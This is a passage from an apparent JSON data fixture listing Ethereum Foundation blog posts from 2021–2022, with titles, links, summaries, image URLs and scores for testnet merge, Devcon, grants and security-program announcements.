"blog.ethereum.org/en/2022/08/03/sepolia-post-merge-upgrade", "summary": "The Sepolia testnet will undergo a post-merge execution layer (EL) upgrade at block 1735371, expected on August 17, 2022 The upgrade will cause EL clients on the network to disconnect from peers which have not transitioned to proof-of-stake. It does not add additional functionality beyond this. Sepolia node operators must...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_8a7434faa592c55e7a7bdface3957a88.jpg", "profile": 10, "updated_on": "2022-08-03T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11677.1187411, "slug": "sepolia-post-merge-upgrade-announcement-301", "topics": [78]}}, {"model": "app.post", "pk": 302, "fields": {"title": "Academic Grants Round grantee announcement", "link": "https://blog.ethereum.org/en/2022/07/29/academic-grants-grantee-announce", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/07/29/academic-grants-grantee-announce", "summary": "We are thrilled to announce the 39 grantees selected for the recent Academic Grants Round. This grants round invited researchers, think-tanks, Ph.D. students, and all those interested in advancing knowledge around the Ethereum ecosystem to submit academic proposals.  Thank you to all those who submitted proposals, and congratulations to...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_bf942aa10b05ae61cf7db99dca5c5470.png", "profile": 10, "updated_on": "2022-07-29T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11667.5187411, "slug": "academic-grants-round-grantee-announcement-302", "topics": [77]}}, {"model": "app.post", "pk": 303, "fields": {"title": "Goerli/Prater Merge Announcement", "link": "https://blog.ethereum.org/en/2022/07/27/goerli-prater-merge-announcement", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/07/27/goerli-prater-merge-announcement", "summary": "For the last testnet proof-of-stake transition, Goerli will merge with Prater. The combined Goerli/Prater network will retain the Goerli name post-merge. Bellatrix, the Prater upgrade readying it for The Merge will happen at epoch 112260, expected at 12:24PM UTC on August 4, 2022. After Bellatrix is activated, the Goerli/Prater merge...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_ac3c2a52228601912d557578f3d1aa0a.jpg", "profile": 10, "updated_on": "2022-07-27T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11663.6787411, "slug": "goerliprater-merge-announcement-303", "topics": [78]}}, {"model": "app.post", "pk": 304, "fields": {"title": "Devcon Scholars Returns & Announcing Devcon Week!", "link": "https://blog.ethereum.org/en/2022/07/20/devcon-scholars-returns-22", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/07/20/devcon-scholars-returns-22", "summary": "Queridos Amigos,  Yesterday, Wave #01 of Devcon tickets sold out just a few minutes after going online! After two years of anticipation, the whole team awaited this moment with curious suspense. But don\u2019t worry, more ticket waves are coming soon.  Today we are excited to announce the return...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_9094f3bdb61991f03619c9d6e3ba7af6.jpg", "profile": 10, "updated_on": "2022-07-20T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11650.2387411, "slug": "devcon-scholars-returns-announcing-devcon-week-304", "topics": [72, 76]}}, {"model": "app.post", "pk": 305, "fields": {"title": "DEVCON VI: TICKET SALES BEGIN & MORE!", "link": "https://blog.ethereum.org/en/2022/07/13/devcon-vi-tickets", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/07/13/devcon-vi-tickets", "summary": "Amigos y amigas!  Today, we want to bring everyone a few details on the ticketing process in advance of Monday\u2019s launch, and we have updates on supporter, volunteer, and discount-ticket applications. As the icing on the cake, we'll also introduce you to the Devcon Community Hubs!  But first,...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_ed930bc0e14d0e489beb16e2c978141d.jpg", "profile": 10, "updated_on": "2022-07-13T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11636.7987411, "slug": "devcon-vi-ticket-sales-begin-more-305", "topics": [72, 76]}}, {"model": "app.post", "pk": 306, "fields": {"title": "Sepolia Merge Announcement", "link": "https://blog.ethereum.org/en/2022/06/30/sepolia-merge-announcement", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/06/30/sepolia-merge-announcement", "summary": "Note: on July 5, 2022, the recommended releases for go-ethereum and Erigon were modified. See \"Client Releases\" for details. Sepolia will be the second of three public testnets to run through The Merge. The network will transition to proof-of-stake when the total difficulty on the proof-of-work chain exceeds 17,000,000,000,000,000, which...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_f145c876a6e0a4d269f75913dc169507.jpg", "profile": 10, "updated_on": "2022-06-30T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11611.8387411, "slug": "sepolia-merge-announcement-306", "topics": [78]}}, {"model": "app.post", "pk": 307, "fields": {"title": "Devcon VI: First Tickets & FINAL WEEK of Speaker Applications", "link": "https://blog.ethereum.org/en/2022/06/28/devcon-vi-auction-raffle-speaker", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/06/28/devcon-vi-auction-raffle-speaker", "summary": "Three weeks ago, we opened the speaker and volunteer applications as well as the discount builder and student tickets, and we are excited about the quality of submissions!  This year, we\u2019ve opened applications for those looking to attend Devcon with Builder and Student discounts, as [Speakers...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_581cd60c083fdde9e041f893e70e260f.png", "profile": 10, "updated_on": "2022-06-28T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11607.9987411, "slug": "devcon-vi-first-tickets-final-week-of-speaker-applications-307", "topics": [72, 76]}}, {"model": "app.post", "pk": 308, "fields": {"title": "Ropsten, Rinkeby & Kiln Deprecation Announcement", "link": "https://blog.ethereum.org/en/2022/06/21/testnet-deprecation", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/06/21/testnet-deprecation", "summary": "Reminder: the Gray Glacier upgrade is scheduled for block 15,050,000, expected June 29, 2022 The Kiln Merge testnet, launched earlier this year, will be shut down shortly after the Ethereum mainnet's transition to proof-of-stake. Ropsten, Ethereum's longest-lived proof-of-work testnet, has transitionned to proof-of-stake. It will be shut down in Q4...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_8d7ea1c612b90c3235dd54044d541b6a.jpg", "profile": 10, "updated_on": "2022-06-21T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11594.5587411, "slug": "ropsten-rinkeby-kiln-deprecation-announcement-308", "topics": [78]}}, {"model": "app.post", "pk": 309, "fields": {"title": "Fellowship Program: Cohort #2 Applications Open & Cohort #1 Roundup", "link": "https://blog.ethereum.org/en/2022/06/21/fellowship-cohort-2-applications-roundup", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/06/21/fellowship-cohort-2-applications-roundup", "summary": "Ethereum is a living thing. Yes, at its core there is a virtual machine (the EVM) that runs and faithfully calculates a new state from block to block, but the magic of Ethereum is that one little state machine can be shared by millions of people who might not have...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_c94877685be7e6cba035ca82681ede7f.png", "profile": 10, "updated_on": "2022-06-21T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11594.5587411, "slug": "fellowship-program-cohort-2-applications-open-cohort-1-roundup-309", "topics": [74]}}, {"model": "app.post", "pk": 310, "fields": {"title": "Gray Glacier Upgrade Announcement", "link": "https://blog.ethereum.org/en/2022/06/16/gray-glacier-announcement", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/06/16/gray-glacier-announcement", "summary": "The Ethereum network will be undergoing a scheduled network upgrade at block 15,050,000, which is expected to occur on Wednesday, June 29, 2022. The exact date is subject to change due to variable block times and time zones. Please upgrade your node before Monday, June 27, 2022 to account for...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_24ff43ef1c52978b2a2e011bb53cfd21.jpg", "profile": 10, "updated_on": "2022-06-16T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11584.9587411, "slug": "gray-glacier-upgrade-announcement-310", "topics": [78]}}, {"model": "app.post", "pk": 311, "fields": {"title": "Spotlight on LatAm: Identity solutions for Govtech", "link": "https://blog.ethereum.org/en/2022/06/07/spotlight-on-latam-identity", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/06/07/spotlight-on-latam-identity", "summary": "The following is an update from Ethereum Foundation Fellow Chuy Cepeda.  Our identities hold immense power. In a time when people take great pride in using multiple pseudonyms or personas, we often think about how to identify ourselves. I identify as a native of Monterrey, Mexico, a Latin-American, a...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_c94877685be7e6cba035ca82681ede7f.png", "profile": 10, "updated_on": "2022-06-07T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11567.6787411, "slug": "spotlight-on-latam-identity-solutions-for-govtech-311", "topics": [74]}}, {"model": "app.post", "pk": 312, "fields": {"title": "DEVCON VI: Applications Online, Participation Details Inside", "link": "https://blog.ethereum.org/en/2022/06/06/devcon-vi-details", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/06/06/devcon-vi-details", "summary": "Queridos amigos,  It\u2019s happening. Devcon is back!  When we first announced that Devcon would take place in Bogot\u00e1, we spoke about all the city had to offer, and what we dreamed the event could become.  Later this year, we will finally meet in Bogot\u00e1. With Devconnect now...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_581cd60c083fdde9e041f893e70e260f.png", "profile": 10, "updated_on": "2022-06-06T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11565.7587411, "slug": "devcon-vi-applications-online-participation-details-inside-312", "topics": [72, 76]}}, {"model": "app.post", "pk": 313, "fields": {"title": "Ropsten TTD Announcement", "link": "https://blog.ethereum.org/en/2022/06/03/ropsten-merge-ttd", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/06/03/ropsten-merge-ttd", "summary": "A Terminal Total Difficulty (TTD) of 50000000000000000 has been selected for the Ropsten Merge. Stakers and node operators must manually override the TTD in both their execution and consensus layer clients before June 7, 2022. Proof-of-Work testnets can have volatile hash rates and the exact timing of The Merge on...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_ae4fdccde72988ce82e722f47913acb3.png", "profile": 10, "updated_on": "2022-06-03T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11559.9987411, "slug": "ropsten-ttd-announcement-313", "topics": [78]}}, {"model": "app.post", "pk": 314, "fields": {"title": "Grantee Roundup: May 2022", "link": "https://blog.ethereum.org/en/2022/06/01/may-22-grantee-roundup", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/06/01/may-22-grantee-roundup", "summary": "It\u2019s always fun to hear about new grants as they\u2019re awarded, but what happens after the announcement? In this series, we check in on projects that are well underway - or already at the finish line. Read on to learn about some recent milestones and achievements by grantees!...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_fd63dc334e72e1c2885cb7969adc1faf.jpg", "profile": 10, "updated_on": "2022-06-01T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11556.1587411, "slug": "grantee-roundup-may-2022-314", "topics": [77]}}, {"model": "app.post", "pk": 315, "fields": {"title": "Ropsten Merge Announcement", "link": "https://blog.ethereum.org/en/2022/05/30/ropsten-merge-announcement", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/05/30/ropsten-merge-announcement", "summary": "Ropsten will be the first longstanding testnet to run through The Merge A new Ropsten Beacon Chain was launched on May 30, 2022 to provide consensus to the network The Ropsten Beacon Chain will upgrade to merge-compatible protocol rules (Bellatrix) at slot 24000, expected on June 2, 2022 After this,...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_7edef98ba154912a7bb4f57c2dd74bc8.jpg", "profile": 10, "updated_on": "2022-05-30T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11552.3187411, "slug": "ropsten-merge-announcement-315", "topics": [78]}}, {"model": "app.post", "pk": 316, "fields": {"title": "Wrapping up Devconnect, looking ahead!", "link": "https://blog.ethereum.org/en/2022/05/30/devconnect-wrap", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/05/30/devconnect-wrap", "summary": "A few weeks ago, we came together in Amsterdam for the first-ever Devconnect. Over eight days, members of the Ethereum community hosted events, intensive workshops, and enlightening talks.  When we announced Devconnect, we envisioned the ecosystem coming together for depth-first and fruitful discussions, and to learn while making serious...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_aa8a920fa8d267bc4e47d3024fa01903.png", "profile": 10, "updated_on": "2022-05-30T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11552.3187411, "slug": "wrapping-up-devconnect-looking-ahead-316", "topics": [72, 73]}}, {"model": "app.post", "pk": 317, "fields": {"title": "Finalized no. 35", "link": "https://blog.ethereum.org/en/2022/05/19/finalized-no-35", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/05/19/finalized-no-35", "summary": "tl;dr  ETHStaker/clr.fund Ethereum Staking CLR in progress! Don't wait, 5 days left to contribute Data Availability Sampling is a hard but critical problem. Submit a proposal to the DAS RFP to get involved: $1.5M in funding available!...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_4dae2a4ab4b6c89615b4b5c624c04b52.jpg", "profile": 10, "updated_on": "2022-05-19T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11531.1987411, "slug": "finalized-no-35-317", "topics": [75]}}, {"model": "app.post", "pk": 318, "fields": {"title": "Secured #4: Bug Bounty Rewards now up to $250,000 USD", "link": "https://blog.ethereum.org/en/2022/05/16/secured-no-4", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/05/16/secured-no-4", "summary": "The Ethereum Foundation Bug Bounty Program is one of the earliest and longest running programs of its kind. It was launched in 2015 and targeted the Ethereum PoW mainnet and related software. In 2020, a second Bug Bounty Program for the new Proof-of-Stake Consensus Layer was launched, running alongside the...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_630d77544672a1e0df792c0d71489bd6.jpg", "profile": 10, "updated_on": "2022-05-16T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11525.4387411, "slug": "secured-4-bug-bounty-rewards-now-up-to-250000-usd-318", "topics": [75]}}, {"model": "app.post", "pk": 319, "fields": {"title": "Ethereum Foundation Report", "link": "https://blog.ethereum.org/en/2022/04/18/ef-report-april-2022", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/04/18/ef-report-april-2022", "summary": "Today, we\u2019ve published the EF report, which we hope helps the community understand what the Ethereum Foundation is, our core principles, and our vision of Ethereum as an infinite garden.  Click here to read the full report, and to learn more about the EF, our resource allocation processes, 2021...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_3cca8441964ecec58d88165b471b8331.jpg", "profile": 10, "updated_on": "2022-04-18T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11471.6787411, "slug": "ethereum-foundation-report-319", "topics": [80]}}, {"model": "app.post", "pk": 320, "fields": {"title": "Secured #3: Security Teams", "link": "https://blog.ethereum.org/en/2022/04/14/secured-no-3", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/04/14/secured-no-3", "summary": "Over the past year, the Ethereum Foundation has significantly grown its team of dedicated security researchers and engineers. Members have joined from a variety of backgrounds ranging from cryptography, security architecture, risk management, exploit development as well as having worked on red and blue teams. The members come from different...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_630d77544672a1e0df792c0d71489bd6.jpg", "profile": 10, "updated_on": "2022-04-14T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11463.9987411, "slug": "secured-3-security-teams-320", "topics": [75]}}, {"model": "app.post", "pk": 321, "fields": {"title": "Finalized no. 34", "link": "https://blog.ethereum.org/en/2022/03/23/finalized-no-34", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/03/23/finalized-no-34", "summary": "tl;dr  Kiln\ud83e\uddf1\ud83d\udd25 is up, check it out #TestingTheMerge is in full swing. Do your part, get involved!...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_4dae2a4ab4b6c89615b4b5c624c04b52.jpg", "profile": 10, "updated_on": "2022-03-23T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11421.7587411, "slug": "finalized-no-34-321", "topics": [75]}}, {"model": "app.post", "pk": 322, "fields": {"title": "Announcing the Kiln Merge Testnet", "link": "https://blog.ethereum.org/en/2022/03/14/kiln-merge-testnet", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/03/14/kiln-merge-testnet", "summary": "The Kintsugi \ud83c\udf75 merge testnet, launched late December, has been a valuable testing ground for The Merge. Through various test suites, multi-client devnets, shadow forks of Goerli, application deployments, and the community's help #TestingTheMerge, we've arrived at a set of stable and robust protocol specifications. Now that clients have implemented...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_208a21257acb552128b7b6d0f5277d58.jpg", "profile": 10, "updated_on": "2022-03-14T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11404.4787411, "slug": "announcing-the-kiln-merge-testnet-322", "topics": [78]}}, {"model": "app.post", "pk": 323, "fields": {"title": "Secured #2: Public Vulnerability Disclosures", "link": "https://blog.ethereum.org/en/2022/03/09/secured-no-2", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/03/09/secured-no-2", "summary": "Today, we disclosed the first set of vulnerabilities from the Ethereum Foundation's Bug Bounty Programs. These vulnerabilities were previously discovered and reported directly to the Ethereum Foundation or client teams via the Bug Bounty Programs for both the Execution Layer and Consensus Layer.  Through its Bug Bounty Programs, which...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_630d77544672a1e0df792c0d71489bd6.jpg", "profile": 10, "updated_on": "2022-03-09T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11394.8787411, "slug": "secured-2-public-vulnerability-disclosures-323", "topics": [75]}}, {"model": "app.post", "pk": 324, "fields": {"title": "Announcing Grants Round for Academic Research", "link": "https://blog.ethereum.org/en/2022/03/01/academic-grants-round", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/03/01/academic-grants-round", "summary": "We are excited to announce a new wave of grants to fund formal research that aims to create more knowledge about Ethereum, blockchain technology, and related domains. We encourage academics, research centers, PhD Students and all those interested in researching Ethereum to submit their project proposals. This grants round has...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_bf942aa10b05ae61cf7db99dca5c5470.png", "profile": 10, "updated_on": "2022-03-01T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11379.5187411, "slug": "announcing-grants-round-for-academic-research-324", "topics": [77]}}, {"model": "app.post", "pk": 325, "fields": {"title": "Grantee Roundup: January 2022 - Japan Local Grants Edition!", "link": "https://blog.ethereum.org/en/2022/02/24/japan-local-grants-round", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/02/24/japan-local-grants-round", "summary": "In today\u2019s roundup, we\u2019re excited to feature four recipients from a recent Local Grants wave in Japan! We see Ethereum as an ever-growing, creative and inclusive playground, and it is our responsibility to let everyone keep playing.  It\u2019s not easy to commit to public goods or novel use cases...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_fd63dc334e72e1c2885cb7969adc1faf.jpg", "profile": 10, "updated_on": "2022-02-24T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11369.9187411, "slug": "grantee-roundup-january-2022-japan-local-grants-edition-325", "topics": [77]}}, {"model": "app.post", "pk": 326, "fields": {"title": "Devcon: Hacia Colombia en 2022 [Redux]", "link": "https://blog.ethereum.org/en/2022/02/18/colombia-in-2022-redux", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/02/18/colombia-in-2022-redux", "summary": "Queridos Amigos,  A few years ago, we outlined what Devcon was all about in the original version of this post, and spoke to our renewed focus on growing the Ethereum ecosystem.  In this updated version, we're excited to re-announce Devcon 6, and to share details on our site-selection,...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_2b32fe55f8984608f37d72635a3f8721.jpg", "profile": 10, "updated_on": "2022-02-18T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11358.3987411, "slug": "devcon-hacia-colombia-en-2022-redux-326", "topics": [72, 76]}}, {"model": "app.post", "pk": 327, "fields": {"title": "Allocation Update: Q3 and Q4, 2021", "link": "https://blog.ethereum.org/en/2022/02/15/esp-q3-q4-allocation-update", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/02/15/esp-q3-q4-allocation-update", "summary": "This one's a double header! Below you'll find the lists of grantees from both Q3 and Q4 of 2021.  A note on categories: where we once listed Ethereum 1.0/1.x or Ethereum 2.0, you'll now see \"Execution Layer\" and \"Consensus Layer\" respectively. This is part of a broader effort to...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_fd63dc334e72e1c2885cb7969adc1faf.jpg", "profile": 10, "updated_on": "2022-02-15T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11352.6387411, "slug": "allocation-update-q3-and-q4-2021-327", "topics": [77]}}, {"model": "app.post", "pk": 328, "fields": {"title": "Devconnect: 18-25 April 2022 in Amsterdam", "link": "https://blog.ethereum.org/en/2022/02/01/devconnect-dates-and-details", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/02/01/devconnect-dates-and-details", "summary": "In our last post, we outlined Devconnect as a week-long gathering that will feature independent Ethereum events, which aim to bring the Ethereum community together in smaller groups to talk, learn about, or make serious progress on specific subjects. Learn more at Devconnect.org...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_83966632df3abe4e7f3b3bac6f3aabc9.jpg", "profile": 10, "updated_on": "2022-02-01T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11325.7587411, "slug": "devconnect-18-25-april-2022-in-amsterdam-328", "topics": [80]}}, {"model": "app.post", "pk": 329, "fields": {"title": "Finalized no. 33", "link": "https://blog.ethereum.org/en/2022/01/31/finalized-no-33", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/01/31/finalized-no-33", "summary": "tl;dr  Merge progress -- minor spec updates, engineering full steam ahead \ud83d\ude82 No progress in client diversity. Be selfish, run a minority client!...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_4dae2a4ab4b6c89615b4b5c624c04b52.jpg", "profile": 10, "updated_on": "2022-01-31T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11323.8387411, "slug": "finalized-no-33-329", "topics": [75]}}, {"model": "app.post", "pk": 330, "fields": {"title": "Grantee Roundup: December 2021", "link": "https://blog.ethereum.org/en/2022/01/31/esp-roundup-december-2021", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/01/31/esp-roundup-december-2021", "summary": "It\u2019s always fun to hear about new grants as they\u2019re awarded, but what happens after the announcement? In this series, we\u2019ll check in on a couple of projects that are well underway - or already at the finish line. Read on to learn about some recent milestones and achievements by...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_fd63dc334e72e1c2885cb7969adc1faf.jpg", "profile": 10, "updated_on": "2022-01-31T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11323.8387411, "slug": "grantee-roundup-december-2021-330", "topics": [77]}}, {"model": "app.post", "pk": 331, "fields": {"title": "The great renaming: what happened to Eth2?", "link": "https://blog.ethereum.org/en/2022/01/24/the-great-eth2-renaming", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/01/24/the-great-eth2-renaming", "summary": "Ethereum is a protocol undergoing significant changes. Client teams are upgrading the protocol to scale to meet global demand while improving security and decentralization. Beyond protocol development, a critical shift in Ethereum has been the movement away from \u2018Eth1\u2019 and \u2018Eth2\u2019 terminology.\u00a0As of late 2021, core developers stopped using the...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/ethereum-hero.png", "profile": 10, "updated_on": "2022-01-24T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11310.3987411, "slug": "the-great-renaming-what-happened-to-eth2-331", "topics": [79]}}, {"model": "app.post", "pk": 332, "fields": {"title": "Announcing the Kintsugi Merge Testnet", "link": "https://blog.ethereum.org/en/2021/12/20/kintsugi-merge-testnet", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/12/20/kintsugi-merge-testnet", "summary": "Since returning from the Amphora merge workshop, client teams have been hard at work implementing the latest versions of merge specifications and testing them on devnets.  After four ephemeral devnets, Kintsugi \ud83c\udf75, a longer-lived public testnet, is now live!  Although client development and UX continue to be refined,...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_199e1f8087c60cd5187bc4bbb47d8396.jpg", "profile": 10, "updated_on": "2021-12-20T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11243.1987411, "slug": "announcing-the-kintsugi-merge-testnet-332", "topics": [78]}}, {"model": "app.post", "pk": 333, "fields": {"title": "Announcing the Client Incentive Program", "link": "https://blog.ethereum.org/en/2021/12/13/client-incentive-program", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/12/13/client-incentive-program", "summary": "Note: this post was updated on April 4, 2022 to include a full copy of the Client Incentive Program details.  A diverse set of clients is key to the Ethereum network's health and decentralization. Diversity ensures that innovation continues at the base layer of the protocol, that the network...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_85feb744f451f63fe2ce9b39a012fbdd.jpg", "profile": 10, "updated_on": "2021-12-13T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11229.7587411, "slug": "announcing-the-client-incentive-program-333", "topics": [80]}}, {"model": "app.post", "pk": 334, "fields": {"title": "An update on Devcon 6, and something new...", "link": "https://blog.ethereum.org/en/2021/12/13/announcing-devconnect", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/12/13/announcing-devconnect", "summary": "It\u2019s been a little while, and we\u2019ve got some news....", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_0d997da374443c74f965f864a7ed9998.jpg", "profile": 10, "updated_on": "2021-12-13T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11229.7587411, "slug": "an-update-on-devcon-6-and-something-new-334", "topics": [80]}}, {"model": "app.post", "pk": 335, "fields": {"title": "Spotlight on Kenya: Microinsurance for Every Farmer", "link": "https://blog.ethereum.org/en/2021/12/07/fellows-spotlight-on-kenya", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/12/07/fellows-spotlight-on-kenya", "summary": "In Sub-Saharan Africa, only 3% of 48 million smallholder farmers are insured. Owning 1 acre of land and earning approximately $1.40 per person per day characterize a smallholder farmer. Smallholder farmers often own a mixture of cash crops and subsistence or non-commercial farming; and, they lack the financial and technological...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_c94877685be7e6cba035ca82681ede7f.png", "profile": 10, "updated_on": "2021-12-07T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11218.2387411, "slug": "spotlight-on-kenya-microinsurance-for-every-farmer-335", "topics": [74]}}, {"model": "app.post", "pk": 336, "fields": {"title": "Verkle tree structure", "link": "https://blog.ethereum.org/en/2021/12/02/verkle-tree-structure", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/12/02/verkle-tree-structure", "summary": "A Verkle tree is a commitment scheme that works similar to a Merkle tree, but has much smaller witnesses. It works by replacing the hashes in a Merkle tree with a vector commitment, which makes wider branching factors more efficient.  Thanks to Kevaundray Wedderburn for feedback on the post....", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/r&d.jpg", "profile": 10, "updated_on": "2021-12-02T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11208.6387411, "slug": "verkle-tree-structure-336", "topics": [75]}}, {"model": "app.post", "pk": 337, "fields": {"title": "How The Merge Impacts Ethereum\u2019s Application Layer", "link": "https://blog.ethereum.org/en/2021/11/29/how-the-merge-impacts-app-layer", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/11/29/how-the-merge-impacts-app-layer", "summary": "Ethereum's transition to proof of stake -- The Merge -- is near: devnets are being stood up, specifications are being finalized and community outreach has begun in earnest. The Merge is designed to have minimal impact on how Ethereum operates for end users, smart contracts and dapps. That said, there...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/r&d.jpg", "profile": 10, "updated_on": "2021-11-29T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11202.8787411, "slug": "how-the-merge-impacts-ethereums-application-layer-337", "topics": [75]}}, {"model": "app.post", "pk": 338, "fields": {"title": "Update on the partnership between EF and UNICEF", "link": "https://blog.ethereum.org/en/2021/11/24/ef-unicef-update", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/11/24/ef-unicef-update", "summary": "Since 2019, we have supported UNICEF\u2019s CryptoFund with recurring contributions, and we are excited about our most recent donation too. Today, I would like to share the story of our journey together, to recognize some of the achievements of our partnership, and to speak a bit more about what\u2019s next....", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_85feb744f451f63fe2ce9b39a012fbdd.jpg", "profile": 10, "updated_on": 